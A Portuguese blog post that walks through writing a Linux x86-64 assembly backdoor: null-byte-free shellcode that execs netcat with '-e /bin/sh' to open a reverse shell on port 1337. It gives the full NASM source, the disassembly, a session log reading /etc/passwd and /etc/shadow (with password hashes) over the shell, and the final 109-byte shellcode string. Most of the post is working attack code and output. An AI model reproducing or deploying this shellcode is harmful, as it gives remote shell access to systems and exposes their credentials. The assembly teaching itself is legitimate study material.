---
layout: post
title: writing backdoor in ASM linux 64 bits sycall Netcat
categories: [assembly]
tags: [asm ,asm 64 bit,syscall,netcat,linux]
fullview: true
comments: true
---
<p>No ultimo artigo falei sobre syscall linux asm 64 bits, demostrei alguns exemplos de como usa-la, estou tentando arrumar tempo para escrever mais sobre o assunto, que não deixa de ser interessante, em fim, voltando a falar sobre syscall, a ideia desse artigo é desenvolver um back connect em 'nasm' ou asm, usando a própria função execve() , como você pode ver é possível executar qualquer comando  desde que passe os comandos corretamente, um back connect poderia ser feito usando apenas asm, criando socket's, porém é muito mais complexo, seja ele um bind() ou reverse(). Nesse caso  lembra de todos passos feito em C, criar struct, declarar família, bzero() isso mesmo preencher a struct,e depois chamar a syscall number 49 que corresponde a  função bind() lembra do accept() accept(sock, (struct sockaddr *)&client, &sockaddr_len) a syscall dele é 43, e etc... é um trabalho e tanto criar do zero, analisaremos  um backdoor desse tipo futuramente :D, em fim,  podemos usar a  própria função que já conhecermos para  desenvolver tal façanha, um backdoor reverse() em asm.</p>
<h3>O que Será preciso ?</h3>
<p>Eu acho que você deve saber mais ou menos como irá funcionar, a ideia vai ser setar os argumento do comando nc, o canivete suíço como vários administradores de rede conhece, Com o netcat podemos simplesmente setar os comandos que precisamos para em fim executar um shell reversa seria mais ou menos assim nc meu_ip 4444 -e /bin/sh, esses são os argumentos que precisamos passar para stack e depois chamar syscall 59 que corresponde a execve() blz? tudo pronto ? vamos lá para nossa estratégia </p>
<h3>Estratégia Militar</h3>
<pre>
                     Missão  Executar Backdoor reverse()
=====================================================
Objetivo: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)
=====================================================
1 - colocar a string "bin/nc" na stack usando nosso fusileiro
2 - colocar a string  "bin/sh" no campo de batalha 'stack'
3 - colocar o argumento "-e" com uma sniper no campo de batalha
4 - colocar a string "1337" que é nossa  porta  para conexão reversa (colocar nosso fusileiro de Elite  na porta "1337")
5 - chamar nossa função  que contém uma DB com a string  do IP "127.0.0.1" (OBS: pegar o local onde a bomba seja lançada. )
6 -  empurrar todos argumento na stack (Retirar todos Fusileiro de Elite do campo de batalha)
7 -  Chamar a syscall 59 (Lançador de Míssil  bomba nuclear para o endereço 127.0.0.1)
8 -  Compilar e executar nosso plano de attack
9 - Shell reverse executando sucesso
</pre>
<h3>Colocando a Estratégia em prática.</h3>
<p>Vamos dar uma olha nos quais fusileiros nós temos.Registradores( R10, RCX,RBX,RDX ,R9,RDI)</p>
<p>Temos 6 homens que vão para o campo de batalha, nossa turma da Elite 1337 leet. e temos claro nossa arma nuclear lançador de Míssil Sys 59.</p>
<p>O nosso primeiro fusileiro RDX vai ser executar a parte inicial dele levar até a base inimiga (stack) a bomba c4, "bin/nc". </p>
{% highlight asm %}
; missão 01
BITS 64
xor    	rdx,rdx ; zerando rdx
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp
{% endhighlight %}
<p> Essas linhas acima é muito simples, zeramos o registrador que queremos usar, nesse caso o RDX, os Opcodes dessa linha fica mais ou menos assim 48 31 d2, depois movermos para o mesmo a string 636e2f6e69622fff que é bin/nc de hex para ascii. movamente, em seguida faço um rotate com a instrução shr nos 8 bytes significativos, A  shr instrução desloca todos os bits do operando destino para a direita um pouco mudando um zero no bit HO. os bits que deslizam fora da extremidade desaparecem (com exceção do último, que vai para o flag de carry). depois "salvamos nossa string no rsp".</p>
{% highlight asm %}
; missão 02
mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
push 	rcx
mov	rcx,rsp
{% endhighlight %}
<p>O próximo passo também segue o mesmo principio do anterior, na primeira linha vai a string hs/nib/ ou bin/sh  a ideia de colocar um "fff", no final da string serve apenas para preencher assim evitando bytes nulos, "bad char", para entender melhor essa parte vamos dar uma olhada no dessasembler:</p>
{% highlight asm %}
// não faz parte do código
400095:	48 b9 ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rcx
{% endhighlight %}
<p>Entendendo melhor o que compilador faz ele usa a instrução movabs para mover os dados. isso porque você precisa usar movabs para forçar a realocação de 64 bits. são chamados 'Immediates' Valores imediatos dentro instruções permanecem 32 bits e seu valor é o sinal estendido para 64 bits antes do cálculo. outro exemplo vamos ver agora: mov 0x89abcdef,% al, o que queremos é mover apenas o valor 89abcdef para parte baixa do registrador. mas olha só o que acontece com objdump a0 df ce ab 89 00 00 movabs 0x89abcdef,% al, esse valor é complementado, por isso precisamos colocar movl em 32 bits ou movq 64 bits. Na AT & T sintaxe do tamanho de operandos de memória é determinado a partir do último caractere da instrução mnemônica. Sufixos mnemônico b , c ,  l e q especificar byte (8 bits), word (16-bit), comprimento (32-bit) e palavra quádrupla referências de memória (64-bit).No código de 64 bits, movabs pode ser utilizado para codificar o mov instrução com o deslocamento de 64-bit ou operando imediato. por isso aparece os bad char.vamos continuar com nosso código:</p>

{% highlight asm %}
; missão 03
mov     rbx,0x652dffffffffffff ; nosso argumento -e
shr	rbx,0x30
push	 rbx
mov	rbx,rsp
; missão 04
mov	r10,0x37333331ffffffff ; nossa porta 1337
shr 	r10,0x20
push r10
mov	r10,rsp
{% endhighlight  %}

<p>Basicamente  passamos dois passos do nosso desafio , colocar o argumento -e e o numero da porta (1337)para função execve("/bin/nc",{"/bin/nc","1337","-e","/bin/sh"},NULL) , isso quer dize que precisamos apenas da string do IP que vai ser conectar, por meio do netcat, nesse caso não vamos mover a string "127.0.0.1". pois o zero da string vai chegar como bad char lembra ? isso mesmo não poderemos deixar bad char em nosso código precisamos deixar o código limpo, então lembre sempre que for possível usar funções em assembly faça  até para ficar mais dinâmico seu código, as funções é uma boa arma para evitar os bad char ou qualquer tipo de catacter que possa atrapalhar, certo que ela vai precisar mais de bytes, lógico, mas isso não é o problema pra isso existe a matemática :D vamos continuar com nosso código</p>

{% highlight asm %}
; missão 05
jmp short ip
continuar:
pop 	r9
; missão 06
push	rdx  ;push NULL
push 	rcx  ;push address shellbin 'bin/sh'
push	rbx  ;push address argumento  '-e'
push	r10  ;push address da porta '1337'
push	r9   ;push address do 'ip'
push 	rdi  ;push address do '/bin/nc'
; missão 07
mov    	rsi,rsp
mov    	al,59 ; syscall 59 evecve()
syscall

; função do IP
ip:
	call  continuar  ; função  que organiza os argumento
	db "127.0.0.1" ;8 bytes
{% endhighlight %}

<p>Vamos para parte final  da nossa  missão, primeiro faço um pulo para a função do contém nosso endereço IP, local nesse caso jmp short ip, DB define 8 bytes, em seguida chamo a função continuar para passar os argumento da função execve() a ideia  primeiro puxamos o argumento NULL, depois endereço  da bin/sh , argumento -e , porta 1337 endereço IP, empurramos /binnc claro e por fim chamamos o lançador de míssil sys59. :D  vamos compilar e ver como ficou:</p>
{% highlight asm %}
---------------------------------------------------------
root@ChmoSec:~/Desktop/linux# cat backdoor.asm
BITS 64
xor    	rdx,rdx ; zerando rdx
mov 	rdi,0x636e2f6e69622fff ; string /bin/nc
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff ; string /bin/sh
shr	rcx,0x08
push 	rcx
mov	rcx,rsp

mov     rbx,0x652dffffffffffff ; argumento -e  
shr	rbx,0x30
push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff  ; porta do nc 1337
shr 	r10,0x20
push 	r10
mov	r10,rsp

jmp short ip ; chamando a função com IP
continuar:
pop 	r9

push	rdx  ;push NULL ; argumento nulll evecve()
push 	rcx  ;push address do 'bin/sh'
push	rbx  ;push address do argumento '-e'
push	r10  ;push address da porta '1337'
push	r9   ;push address do local 'ip'
push 	rdi  ;push address netcat  '/bin/nc'

mov    	rsi,rsp
mov    	al,59 ; sycall 59
syscall


ip:
	call  continuar
	db "127.0.0.1"
{% endhighlight %}
<pre>
root@ChmoSec:~/Desktop/linux# nasm -f elf64 backdoor.asm
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux# ld backdoor.o -o backdoor
ld: warning: cannot find entry symbol _start; defaulting to 0000000000400080
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux# objdump -d backdoor

backdoor:     file format elf64-x86-64


Disassembly of section .text:
</pre>


{% highlight asm %}
0000000000400080 <continuar-0x4e>:
  400080:	48 31 d2             	xor    %rdx,%rdx
  400083:	48 bf ff 2f 62 69 6e 	movabs $0x636e2f6e69622fff,%rdi
  40008a:	2f 6e 63
  40008d:	48 c1 ef 08          	shr    $0x8,%rdi
  400091:	57                   	push   %rdi
  400092:	48 89 e7             	mov    %rsp,%rdi
  400095:	48 b9 ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rcx
  40009c:	2f 73 68
  40009f:	48 c1 e9 08          	shr    $0x8,%rcx
  4000a3:	51                   	push   %rcx
  4000a4:	48 89 e1             	mov    %rsp,%rcx
  4000a7:	48 bb ff ff ff ff ff 	movabs $0x652dffffffffffff,%rbx
  4000ae:	ff 2d 65
  4000b1:	48 c1 eb 30          	shr    $0x30,%rbx
  4000b5:	53                   	push   %rbx
  4000b6:	48 89 e3             	mov    %rsp,%rbx
  4000b9:	49 ba ff ff ff ff 31 	movabs $0x37333331ffffffff,%r10
  4000c0:	33 33 37
  4000c3:	49 c1 ea 20          	shr    $0x20,%r10
  4000c7:	41 52                	push   %r10
  4000c9:	49 89 e2             	mov    %rsp,%r10
  4000cc:	eb 11                	jmp    4000df <ip>

00000000004000ce <continuar>:
  4000ce:	41 59                	pop    %r9
  4000d0:	52                   	push   %rdx
  4000d1:	51                   	push   %rcx
  4000d2:	53                   	push   %rbx
  4000d3:	41 52                	push   %r10
  4000d5:	41 51                	push   %r9
  4000d7:	57                   	push   %rdi
  4000d8:	48 89 e6             	mov    %rsp,%rsi
  4000db:	b0 3b                	mov    $0x3b,%al
  4000dd:	0f 05                	syscall

00000000004000df <ip>:
  4000df:	e8 ea ff ff ff       	callq  4000ce <continuar>
  4000e4:	31 32                	xor    %esi,(%rdx)
  4000e6:	37                   	(bad)  
  4000e7:	2e 30 2e             	xor    %ch,%cs:(%rsi)
  4000ea:	30 2e                	xor    %ch,(%rsi)
  4000ec:	31                   	.byte 0x31

{% endhighlight %}
<p> Ultimo passo 09 executar e ver se funcionou :D</p>
<pre>
=======================Terminal 01 =========================
root@ChmoSec:~/Desktop/linux# nc -l -v -p 1337
listening on [any] 1337 ...
======================= Terminal 02 =========================
root@ChmoSec:~/Desktop/linux# nasm -f elf64 backdoor.asm
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux#
root@ChmoSec:~/Desktop/linux# ld backdoor.o -o backdoor
ld: warning: cannot find entry symbol _start; defaulting to 0000000000400080
root@ChmoSec:~/Desktop/linux# ./backdoor
=======================Terminal 01 Attack :D ========================
root@ChmoSec:~/Desktop/linux# nc -l -v -p 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 45732
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
colord:x:103:107:colord colour management daemon,,,:/var/lib/colord:/bin/false
usbmux:x:104:46:usbmux daemon,,,:/home/usbmux:/bin/false
miredo:x:105:65534::/var/run/miredo:/bin/false
ntp:x:106:111::/home/ntp:/bin/false
Debian-exim:x:107:112::/var/spool/exim4:/bin/false
avahi:x:108:115:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
beef-xss:x:109:116::/var/lib/beef-xss:/bin/false
dradis:x:110:118::/var/lib/dradis:/bin/false
pulse:x:111:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
haldaemon:x:112:121:Hardware abstraction layer,,,:/var/run/hald:/bin/false
iodine:x:113:65534::/var/run/iodine:/bin/false
postgres:x:114:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
stunnel4:x:116:127::/var/run/stunnel4:/bin/false
statd:x:117:65534::/var/lib/nfs:/bin/false
sslh:x:118:129::/nonexistent:/bin/false
Debian-gdm:x:119:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
rtkit:x:120:131:RealtimeKit,,,:/proc:/bin/false
saned:x:121:132::/home/saned:/bin/false
snmp:x:122:133::/var/lib/snmp:/bin/false
cat /etc/shadow
root:$6$kH5cC/rH$lHFayDR/fc7pKk6IPpwvMCtw.Wty9BpgJruVdpm/hYXEBJ0qmsqj4F7HUfN/VFPJHG0ECeWDckIZ2YCxVu2vP1:16176:0:99999:7:::
daemon:*:15791:0:99999:7:::
bin:*:15791:0:99999:7:::
sys:*:15791:0:99999:7:::
sync:*:15791:0:99999:7:::
games:*:15791:0:99999:7:::
man:*:15791:0:99999:7:::
lp:*:15791:0:99999:7:::
mail:*:15791:0:99999:7:::
news:*:15791:0:99999:7:::
uucp:*:15791:0:99999:7:::
proxy:*:15791:0:99999:7:::
www-data:*:15791:0:99999:7:::
backup:*:15791:0:99999:7:::
list:*:15791:0:99999:7:::
irc:*:15791:0:99999:7:::
gnats:*:15791:0:99999:7:::
nobody:*:15791:0:99999:7:::
libuuid:!:15791:0:99999:7:::
mysql:$6$xNcf3eiz$ZFNM7ptTgoCyZ9HgyPy2lxZTiXO2qea.9qHd8ntpbANsr8KrLy2Bv2o.j6enazreEIcA8mEZoS3J/9grlSUt81:16182:0:99999:7:::
messagebus:*:15791:0:99999:7:::
colord:*:15791:0:99999:7:::
usbmux:*:15791:0:99999:7:::
miredo:*:15791:0:99999:7:::
ntp:*:15791:0:99999:7:::
Debian-exim:!:15791:0:99999:7:::
avahi:*:15791:0:99999:7:::
beef-xss:*:15791:0:99999:7:::
dradis:*:15791:0:99999:7:::
pulse:*:15791:0:99999:7:::
haldaemon:*:15791:0:99999:7:::
iodine:*:15791:0:99999:7:::
postgres:*:15791:0:99999:7:::
sshd:*:15791:0:99999:7:::
stunnel4:!:15791:0:99999:7:::
statd:*:15791:0:99999:7:::
sslh:!:15791:0:99999:7:::
Debian-gdm:*:15791:0:99999:7:::
rtkit:*:15791:0:99999:7:::
saned:*:15791:0:99999:7:::
snmp:*:15791:0:99999:7:::
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:6d:7c:7a  
          inet addr:192.168.1.105  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe6d:7c7a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5421 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7918 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4953032 (4.7 MiB)  TX bytes:649364 (634.1 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:332 errors:0 dropped:0 overruns:0 frame:0
          TX packets:332 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:23570 (23.0 KiB)  TX bytes:23570 (23.0 KiB)

^C
root@ChmoSec:~/Desktop/linux#
</pre>
<h3> Conclusão </h3>
<p>Como podemos ver Funciona perfeitamente,:D lembrando com netcat podemos fazer inumeras coisa como fazer scanner de porta capturar banner, transferir arquivo ex: nc -l -p8080 > filename.txt , usar o telnet, fazer um telnet reverso,analise de rede, no windows da pra criar até um backdoor só com ele fazendo ele executar quando o windows iniciar e etc.. como falei é um canivete suíço. lembrando tudo depende da sua criatividade é o ponto fundamental nessa área. assembly pode ser um pouquinho confuso, mas praticando vai ser tornando cada vez melhor de se trabalhar, o principio de criar um backdoor foi mostrar que com assembly podemos criar muitas coisas que as programações de alto nível nós oferece, e melhor saber exatamente como o processador se comporta  em tais situações, futuramente vamos entrar ae no assunto de socket's em assembly, meio que um pouco mais complexo, mas da pra compreender e desfrutar desse conhecimento. até o próximo abraços.</p>
<pre>
root@ChmoSec:~/Desktop/linux# ./shellcode.sh backdoor
"\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08
\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9
\x08\x51\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1
\xeb\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49
\xc1\xea\x20\x41\x52\x49\x89\xe2\xeb\x11\x41\x59\x52\x51\x53\x41\x52
\x41\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x31\x32
\x37\x2e\x30\x2e\x30\x2e\x31"
len:  109
root@ChmoSec:~/Desktop/linux#
</pre>
<p>source: https://github.com/msfcd3r/chmodsecurity/blob/master/backdoor%20.asm<br>
Shellcode: https://github.com/msfcd3r/ASM-64vit/blob/master/backconnect.c </p>
